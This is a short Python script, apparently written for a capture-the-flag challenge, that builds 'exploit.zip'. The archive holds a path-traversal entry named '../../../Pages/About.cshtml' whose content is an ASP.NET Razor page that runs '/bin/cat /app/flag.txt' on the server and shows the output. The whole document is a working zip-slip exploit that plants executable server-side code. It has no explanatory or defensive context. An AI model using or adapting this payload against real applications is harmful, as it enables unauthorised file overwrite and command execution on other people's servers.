import zipfile

zip_filename = 'exploit.zip'
malicious_filename = '../../../Pages/About.cshtml'
malicious_content = '''@page
@{
    var output = "";
    try
    {
        var psi = new System.Diagnostics.ProcessStartInfo();
        psi.FileName = "/bin/cat";
        psi.Arguments = "/app/flag.txt";
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        var process = System.Diagnostics.Process.Start(psi);
        output = process.StandardOutput.ReadToEnd();
        output += process.StandardError.ReadToEnd();
        process.WaitForExit();
    }
    catch (Exception ex)
    {
        output = ex.ToString();
    }
}
<pre>@output</pre>
'''



with zipfile.ZipFile(zip_filename, 'w') as zipf:
    zip_info = zipfile.ZipInfo(malicious_filename)
    zipf.writestr(zip_info, malicious_content)
